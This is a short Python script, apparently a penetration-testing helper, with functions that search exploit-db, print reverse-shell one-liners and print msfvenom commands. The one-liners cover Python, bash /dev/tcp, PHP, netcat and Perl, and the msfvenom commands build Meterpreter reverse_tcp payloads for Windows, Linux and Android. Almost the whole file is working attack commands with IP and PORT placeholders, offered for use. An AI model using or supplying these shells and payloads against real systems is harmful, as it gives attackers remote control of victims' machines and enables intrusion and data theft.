import requests
import subprocess
import base64

def search_exploits(query):
    print(f"Searching exploits for: {query}")
    try:
        url = f"https://www.exploit-db.com/search?q={query}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            print("Exploit search completed")
        else:
            print("Exploit search failed")
    except:
        print("Exploit search requires internet connection")

def generate_shell(shell_type):
    shells = {
        'python': 'python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"IP\\\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);\"',
        'bash': 'bash -i >& /dev/tcp/IP/PORT 0>&1',
        'php': 'php -r \"$sock=fsockopen(\\\"IP\\\",PORT);exec(\\"/bin/sh -i <&3 >&3 2>&3\\\");\"',
        'netcat': 'nc -e /bin/sh IP PORT',
        'perl': 'perl -e \"use Socket;$i=\\\"IP\\\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\">&S\\\");open(STDOUT,\\">&S\\\");open(STDERR,\\">&S\\\");exec(\\"/bin/sh -i\\\");};\"'
    }
    
    if shell_type in shells:
        print(f"Reverse shell ({shell_type}):")
        print(shells[shell_type])
    else:
        print("Available shell types: python, bash, php, netcat, perl")

def generate_payload(payload_type):
    if payload_type == 'windows':
        payload = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > payload.exe"
    elif payload_type == 'linux':
        payload = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > payload.elf"
    elif payload_type == 'android':
        payload = "msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o payload.apk"
    else:
        payload = "Invalid payload type"
    
    print(f"Payload command: {payload}")